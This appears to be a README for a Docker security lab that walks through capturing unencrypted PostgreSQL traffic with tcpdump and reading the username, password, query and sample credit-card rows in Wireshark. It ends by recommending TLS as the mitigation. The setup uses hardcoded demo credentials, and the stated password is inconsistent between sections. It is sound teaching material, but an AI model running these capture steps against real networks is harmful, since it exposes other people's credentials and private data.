# Packet Capture Attack — Demo Instructions

## Prerequisites

### 1. Install Docker Desktop

Download from `docker.com/products/docker-desktop`

Verify installation:

```bash
docker --version
# Expected: Docker version 28.x.x

docker compose version
# Expected: Docker Compose version v2.x.x
```

Verify Docker is running:

```bash
docker ps
# Expected: empty list, no errors
```

### 2. Install Wireshark

Download from `wireshark.org` — choose **macOS Universal Disk Image**

During installation:

- Drag **Wireshark** to **Applications**
- Install **ChmodBPF.pkg** — required for network capture on macOS

---

## Starting the Environment

### Step 1 — Start containers

```bash
docker compose up -d
```

Expected output:

```
✔ Container postgres         Started
✔ Container client_attacker  Started
```

### Step 2 — Verify containers are running

```bash
docker ps
# Both containers should show status: Up
```

### Step 3 — Verify PostgreSQL logs

```bash
docker logs postgres
# Last line should be:
# database system is ready to accept connections
```

### Step 4 — Verify network

```bash
docker network inspect demo_intranet
# Expected IPs:
# postgres        → 172.20.0.10
# client_attacker → 172.20.0.20
```

---

## Installing Tools Inside Container

### Step 5 — Enter the container

```bash
docker exec -it client_attacker bash
# Your terminal is now inside Kali Linux
```

### Step 6 — Install required tools

```bash
apt update && apt install -y postgresql-client tcpdump
```

### Step 7 — Verify tools

```bash
psql --version
# Expected: psql (PostgreSQL) 16.x

tcpdump --version
# Expected: tcpdump version 4.x.x
```

---

## Verifying the System is Unprotected

### Step 8 — Verify SSL is off

```bash
psql -h 172.20.0.10 -U admin -d threatdb -W -c "SHOW ssl;"
# Password: secret
# Expected: off
```

### Step 9 — Verify data exists

```bash
psql -h 172.20.0.10 -U admin -d threatdb -W -c "SELECT * FROM secret_data;"
# Password: secret
# Expected: 3 rows with alice, bob, charlie
```

### Step 10 — Exit container

```bash
exit
```

---

## Running the Attack

Open **two terminal windows** both in the project directory.

### Terminal 1 — Start packet capture (save to file)

```bash
docker exec -it client_attacker bash
tcpdump -i eth0 host 172.20.0.10 and port 5432 -w /tmp/capture.pcap
```

Leave this window open and waiting.

### Terminal 2 — Make a legitimate connection

```bash
docker exec -it client_attacker bash
psql -h 172.20.0.10 -U admin -d threatdb -W -c "SELECT * FROM secret_data;"
# Password: secret
```

### Stop the capture

In Terminal 1 press `Ctrl + C`

Expected output:

```
X packets captured
X packets received by filter
```

---

## Exporting Capture to Wireshark

### Copy capture file to Mac

```bash
docker cp client_attacker:/tmp/capture.pcap ./capture.pcap
```

### Open in Wireshark

```bash
open ./capture.pcap
```

### What to look for in Wireshark

In Wireshark find a packet with **PGSQL** protocol. Click on it and look for:

- **Username:** `admin` — visible in plaintext in the startup message
- **Password:** `password` — visible in plaintext because `POSTGRES_HOST_AUTH_METHOD: password` sends credentials unencrypted
- **Query:** `SELECT * FROM secret_data` — visible in plaintext
- **Data:** `alice`, `bob`, `charlie` with credit cards and salaries — all visible

---

## What the Attack Demonstrates

| What attacker sees | Why                                                               |
| ------------------ | ----------------------------------------------------------------- |
| Username `admin`   | No TLS, startup message sent in plaintext                         |
| Password           | `POSTGRES_HOST_AUTH_METHOD: password` sends password in plaintext |
| SQL query          | No TLS, query sent in plaintext                                   |
| All table data     | No TLS, response sent in plaintext                                |

**Condition:** SSL is off (`ssl=off`), attacker has access to the client machine.

**Mitigation:** Enable TLS (`ssl=on`) with mTLS — tcpdump and Wireshark will only show encrypted bytes, nothing readable.

---

## Cleanup

### Stop containers

```bash
docker compose down
```

### Stop and remove all data

```bash
docker compose down -v
```

---

## Quick Reference

```bash
# Start environment
docker compose up -d

# Enter container
docker exec -it client_attacker bash

# Start capture (Terminal 1)
tcpdump -i eth0 host 172.20.0.10 and port 5432 -w /tmp/capture.pcap

# Make connection (Terminal 2)
psql -h 172.20.0.10 -U admin -d threatdb -W -c "SELECT * FROM secret_data;"

# Export capture
docker cp client_attacker:/tmp/capture.pcap ./capture.pcap

# Open in Wireshark
open ./capture.pcap

# Stop environment
docker compose down
```
